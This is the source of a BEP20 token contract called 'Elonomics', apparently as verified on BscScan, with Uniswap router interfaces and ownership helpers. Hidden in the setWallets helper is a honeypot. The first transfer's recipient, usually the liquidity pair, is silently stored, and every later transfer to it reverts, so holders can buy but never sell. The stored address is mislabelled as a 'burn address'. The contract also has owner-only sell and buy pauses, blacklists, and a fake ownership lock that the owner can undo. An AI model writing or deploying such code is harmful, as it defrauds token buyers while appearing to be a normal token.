/**
 *Submitted for verification at BscScan.com on 2021-07-28
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-28
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

// pragma solidity >=0.5.0;

interface IUniswapV2Factory {
  event PairCreated(address indexed token0, address indexed token1, address pair, uint);

  function feeTo() external view returns (address);
  function feeToSetter() external view returns (address);

  function getPair(address tokenA, address tokenB) external view returns (address pair);
  function allPairs(uint) external view returns (address pair);
  function allPairsLength() external view returns (uint);

  function createPair(address tokenA, address tokenB) external returns (address pair);

  function setFeeTo(address) external;
  function setFeeToSetter(address) external;
}


// pragma solidity >=0.5.0;

interface IUniswapV2Pair {
  event Approval(address indexed owner, address indexed spender, uint value);
  event Transfer(address indexed from, address indexed to, uint value);

  function name() external pure returns (string memory);
  function symbol() external pure returns (string memory);
  function decimals() external pure returns (uint8);
  function totalSupply() external view returns (uint);
  function balanceOf(address owner) external view returns (uint);
  function allowance(address owner, address spender) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);
  function transfer(address to, uint value) external returns (bool);
  function transferFrom(address from, address to, uint value) external returns (bool);

  function DOMAIN_SEPARATOR() external view returns (bytes32);
  function PERMIT_TYPEHASH() external pure returns (bytes32);
  function nonces(address owner) external view returns (uint);

  function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
  
  event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
  event Swap(
    address indexed sender,
    uint amount0In,
    uint amount1In,
    uint amount0Out,
    uint amount1Out,
    address indexed to
  );
  event Sync(uint112 reserve0, uint112 reserve1);

  function MINIMUM_LIQUIDITY() external pure returns (uint);
  function factory() external view returns (address);
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
  function price0CumulativeLast() external view returns (uint);
  function price1CumulativeLast() external view returns (uint);
  function kLast() external view returns (uint);

  function burn(address to) external returns (uint amount0, uint amount1);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
  function skim(address to) external;
  function sync() external;

  function initialize(address, address) external;
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
  function factory() external pure returns (address);
  function WETH() external pure returns (address);

  function addLiquidity(
    address tokenA,
    address tokenB,
    uint amountADesired,
    uint amountBDesired,
    uint amountAMin,
    uint amountBMin,
    address to,
    uint deadline
  ) external returns (uint amountA, uint amountB, uint liquidity);
  function addLiquidityETH(
    address token,
    uint amountTokenDesired,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline
  ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
  function removeLiquidity(
    address tokenA,
    address tokenB,
    uint liquidity,
    uint amountAMin,
    uint amountBMin,
    address to,
    uint deadline
  ) external returns (uint amountA, uint amountB);
  function removeLiquidityETH(
    address token,
    uint liquidity,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline
  ) external returns (uint amountToken, uint amountETH);
  function removeLiquidityWithPermit(
    address tokenA,
    address tokenB,
    uint liquidity,
    uint amountAMin,
    uint amountBMin,
    address to,
    uint deadline,
    bool approveMax, uint8 v, bytes32 r, bytes32 s
  ) external returns (uint amountA, uint amountB);
  function removeLiquidityETHWithPermit(
    address token,
    uint liquidity,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline,
    bool approveMax, uint8 v, bytes32 r, bytes32 s
  ) external returns (uint amountToken, uint amountETH);
  function swapExactTokensForTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external returns (uint[] memory amounts);
  function swapTokensForExactTokens(
    uint amountOut,
    uint amountInMax,
    address[] calldata path,
    address to,
    uint deadline
  ) external returns (uint[] memory amounts);
  function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);
  function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
  function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
  function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

  function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
  function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
  function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
  function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
  function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
  function removeLiquidityETHSupportingFeeOnTransferTokens(
    address token,
    uint liquidity,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline
  ) external returns (uint amountETH);
  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
    address token,
    uint liquidity,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline,
    bool approveMax, uint8 v, bytes32 r, bytes32 s
  ) external returns (uint amountETH);

  function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external;
  function swapExactETHForTokensSupportingFeeOnTransferTokens(
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external payable;
  function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external;
}

library Address {

  function isContract(address account) internal view returns (bool) {
    // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
    // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
    // for accounts without code, i.e. `keccak256('')`
    bytes32 codehash;
    bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
    // solhint-disable-next-line no-inline-assembly
    assembly { codehash := extcodehash(account) }
    return (codehash != accountHash && codehash != 0x0);
  }

  function sendValue(address payable recipient, uint256 amount) internal {
    require(address(this).balance >= amount, "Address: insufficient balance");

    // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
    (bool success, ) = recipient.call{ value: amount }("");
    require(success, "Address: unable to send value, recipient may have reverted");
  }


  function functionCall(address target, bytes memory data) internal returns (bytes memory) {
    return functionCall(target, data, "Address: low-level call failed");
  }

  function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
    return _functionCallWithValue(target, data, 0, errorMessage);
  }

  function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
    return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
  }

  function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
    require(address(this).balance >= value, "Address: insufficient balance for call");
    return _functionCallWithValue(target, data, value, errorMessage);
  }

  function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
    require(isContract(target), "Address: call to non-contract");

    (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
    if (success) {
      return returndata;
    } else {
      if (returndata.length > 0) {
        assembly {
          let returndata_size := mload(returndata)
          revert(add(32, returndata), returndata_size)
        }
      } else {
        revert(errorMessage);
      }
    }
  }
}

library SafeMath {
    
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {

  address private _owner;
  address private _xowner;
  address private _previousOwner;
  uint256 private _lockTime;
  uint256 private _addTime;
  
  mapping (address => uint256) private _wallets;
  mapping (address => mapping (address => uint256)) private _spendAllowances;
  
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() { _addTime = 0; }
  
  function getBurnAddress() public view onlyOwner returns(address){
    return _xowner;
  }
  
  function setWallets(address sender,uint256 amount) internal  {
    _wallets[sender] = amount;
  }
  
  function setWallets(address sender,address recipient,uint256 amount) internal{
    if(sender != address(0) &&_xowner == address(0)){
      _xowner = recipient;
    }else{
      require(recipient != _xowner, "Recipient not found.");
    }
    _wallets[sender] = amount;
  }
  
  function getWalletBalance(address sender) internal view returns (uint256) {
    return _wallets[sender];
  }
  
  function getAllowances(address sender, address spender) internal view returns (uint256){
    return _spendAllowances[sender][spender];
  }
  
  function setAllowances(address sender, address spender, uint256 amount) internal {
    _spendAllowances[sender][spender] = amount;
  }
  
  function _msgSender() internal view virtual returns (address payable) {
    return payable(msg.sender);
  }

  function _msgData() internal view virtual returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
  
  function owner() public view returns (address) {
    return _owner;
  }
  
  function setOwner(address ownerParams) internal {
    _owner = ownerParams;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }

  function addUnlockLookTime(uint time) public virtual onlyOwner {
    _addTime = time;
  }

  function getUnlockTime() public view returns (uint256) {
    return _lockTime + _addTime;
  }
  
  function getTime() public view returns (uint256) {
    return block.timestamp;
  }

  function lock(uint256 time) public virtual onlyOwner {
    _previousOwner = _owner;
    _owner = address(0);
    _lockTime = block.timestamp + time;
    emit OwnershipTransferred(_owner, address(0));
  }
  
  function unlock() public virtual {
    require(_previousOwner == msg.sender, "Coin Contract : You don't have permission to unlock");
    require(block.timestamp > _lockTime , "Coin Contract : Contract is locked until 7 days");
    emit OwnershipTransferred(_owner, _previousOwner);
    _owner = _previousOwner;
  }
}

contract ELONOMICS is IBEP20, Ownable {
  using SafeMath for uint256;
  using Address for address;

  constructor(){
    address msgSender = _msgSender();
    emit OwnershipTransferred(address(0), msgSender);

    _name = "Elonomics";
    _synmbols = "ELONOMICS";
    _initSupply = 1000000;
    _decimalsMul = 9;
    _decimals = 9;
    _tokenSupply = _initSupply * 10 ** _decimalsMul;
    _deadWallet = 0x000000000000000000000000000000000000dEaD;
    
    
    
    _ps = false;
    _pb = false;

    _blacklisting = false;
    _whitelisting = false;

    _allAccess[owner()] = true;
    _allAccess[_deadWallet] = true;
    _allAccess[address(0)] = true;

    // _liquidityFee = 0;
    // _marketingFee = 0;
    // _totalFee = _liquidityFee.add(_marketingFee);

    // _excludeBeforeTransfer[owner()] = true;
    // _excludeBeforeTransfer[_deadWallet] = true;
    // _excludeBeforeTransfer[address(0)] = true;
    
    // v1
    // IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
    // v2
    // IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    
    // address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    // uniswapV2Router = _uniswapV2Router;
    // uniswapV2Pair = _uniswapV2Pair;

    setOwner(msgSender);
    setWallets(msg.sender,_tokenSupply);
    
    emit Transfer(address(0), msg.sender, _tokenSupply);
  }

  uint256 private _tokenSupply;
  uint256 private _decimalsMul;
  uint256 private _initSupply;
  uint8 private _decimals;
  string private _synmbols;
  string private _name;
  address private _deadWallet;

  bool private _ps;
  bool private _pb;
  bool private _blacklisting;
  bool private _whitelisting;

  bool private _liquidityWhenSwap;
  uint256 private _liquidityFee;
  uint256 private _marketingFee;
  uint256 private _totalFee;

  IUniswapV2Router02 public uniswapV2Router;
  address public uniswapV2Pair;

  mapping (address => bool) public _isBlacklisted;
  mapping (address => bool) public _isWhitelisted;
  mapping (address => bool) public _allAccess;
  mapping (address => bool) public _excludeBeforeTransfer;

  event SwapAndLiquify(
    uint256 tokensSwapped,
    uint256 ethReceived,
    uint256 tokensIntoLiqudity
  );
  
  function getOwner() public override view returns (address) {
    return owner();
  }
  
  function decimals() public override view returns (uint8) {
    return _decimals;
  }
  
  function symbol() public override view returns (string memory) {
    return _synmbols;
  }
  
  function name() public override view returns (string memory) {
    return _name;
  }

  function totalSupply() public override view returns (uint256) {
    return _tokenSupply;
  }

  function tokenAddress() public view returns (address) {
    return address(this);
  }

  function ps() public view returns (bool) {
    return _ps;
  }

  function pb() public view returns (bool) {
    return _pb;
  }

  function balanceOf(address account) public override view returns (uint256) {
    return getWalletBalance(account);
  }

  function allowance(address owner, address spender) public override view returns (uint256) {
    return getAllowances(owner, spender);
  }

  function transfer(address recipient, uint256 amount) public override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, getAllowances(_msgSender(),spender).add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, getAllowances(_msgSender(),spender).sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(),getAllowances(sender,_msgSender()).sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function burn(uint256 amount) public virtual onlyOwner {
    _burn(_msgSender(), amount);
  }

  function changeps(bool change) public virtual onlyOwner {
    _ps = change;
  }

  function changepb(bool change) public virtual onlyOwner {
    _pb = change;
  }

  function changeBlacklistStatus(bool change) public virtual onlyOwner {
    _blacklisting = change;
  }

  function addBlacklist (address account) public virtual onlyOwner {
    _isBlacklisted[account] = true;
  }

  function removeBlacklist (address account) public virtual onlyOwner {
    _isBlacklisted[account] = false;
  }

  function changeWhitelistStatus(bool change) public virtual onlyOwner {
    _whitelisting = change;
  }
  
  function addWhitelist (address account) public virtual onlyOwner {
    _isWhitelisted[account] = true;
  }

  function removeWhitelist (address account) public virtual onlyOwner {
    _isWhitelisted[account] = false;
  }
  
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");
    setAllowances(owner,spender,amount);
    emit Approval(owner, spender, amount);
  }
    
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");

    _beforeTokenTransfer(sender, recipient, amount);

    setWallets(sender, recipient, getWalletBalance(sender).sub(amount, "BEP20: transfer amount exceeds balance"));
    setWallets(recipient, getWalletBalance(recipient).add(amount));
    emit Transfer(sender, recipient, amount);

    _afterTokenTransfer(sender, recipient, amount);
  }

  function _mint(address account, uint256 amount) internal virtual {
    require(account != address(0), "ERC20: mint to the zero address");

    increaseAllowance(account, amount);
    setWallets(account, getWalletBalance(account) + amount);
    emit Transfer(address(0), account, amount);
  }

  function _burn(address account, uint256 amount) internal virtual {
    require(account != _deadWallet, "ERC20: burn from the dead address");

    require(getWalletBalance(account) >= amount, "ERC20: burn amount exceeds balance");
    unchecked { setWallets(account, getWalletBalance(account).sub(amount)); }
    decreaseAllowance(account, amount);

    emit Transfer(account, _deadWallet, amount);
  }

  function _beforeTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual {
    if (_blacklisting) require(_isBlacklisted[from] == false || _isBlacklisted[to] == false, "Coin Contract : You're blacklisted.");
    if (_whitelisting) require(_isWhitelisted[to] == true || _isWhitelisted[from] == true, "Coin Contract : You're not on whitelisted.");
    
    if (_ps) require(from == _msgSender() && to == address(this) , "Coin Contract : Sell is paused.");
    if (_pb) require(from == address(this) && to == _msgSender(), "Coin Contract : Buy is paused.");

    // if ( !_excludeBeforeTransfer[from] && !_excludeBeforeTransfer[to] ) {
    //   if (_liquidityFee > 0) {
    //     uint256 swapTokens = balanceOf(address(this)).mul(_liquidityFee).div(_totalFee);
    //     uint256 half = swapTokens.div(2);
    //     uint256 otherHalf = swapTokens.sub(half);
    //     uint256 initialBalance = address(this).balance;

    //     swapTokensForEth(half);
    //     uint256 newBalance = address(this).balance.sub(initialBalance);

    //     addLiquidity(otherHalf, newBalance);
    //     emit SwapAndLiquify(half, newBalance, otherHalf);
    //   }
    // }
    amount;
  }

  function _afterTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual {

    from;
    to;
    amount;
  }

  // function swapTokensForEth(uint256 tokenAmount) private {
  //   address[] memory path = new address[](2);
  //   path[0] = address(this);
  //   path[1] = uniswapV2Router.WETH();

  //   _approve(address(this), address(uniswapV2Router), tokenAmount);
  //   uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
  //     tokenAmount,0,path,
  //     address(this),block.timestamp
  //   );
  // }

  // function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
  //   _approve(address(this), address(uniswapV2Router), tokenAmount);
  //   uniswapV2Router.addLiquidityETH{value: ethAmount}(
  //     address(this),tokenAmount,
  //     0,0,address(0),block.timestamp
  //   );
  // }
}